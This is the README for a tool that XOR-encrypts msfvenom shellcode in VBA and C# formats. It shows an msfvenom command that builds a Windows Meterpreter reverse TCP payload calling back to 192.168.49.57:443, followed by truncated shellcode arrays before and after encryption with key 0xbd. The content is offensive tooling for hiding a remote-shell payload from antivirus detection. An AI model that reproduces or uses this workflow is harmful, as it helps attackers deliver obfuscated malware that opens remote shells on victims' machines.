# XOR_Payload_encryption
This project is ment to be use as an encryptor shellcode produced by msfvenom for "-f vbapplication" and "-f csharp"



➜  ~ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.57 LPORT=443 EXITFUNC=thread -f vbapplication
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 375 bytes

Final size of vbapplication file: 1302 bytes
buf = Array(252,232,143,0,0,0,96,13.....


Running: 
xorsharp

 xorcharp  'buf = Array(252,232,143,0,0.....)' 0xbd

--> Output:


Counter:  376
Key:  0xbd
Key:  189
buf =  Array(189, 189, 189, 221,... )




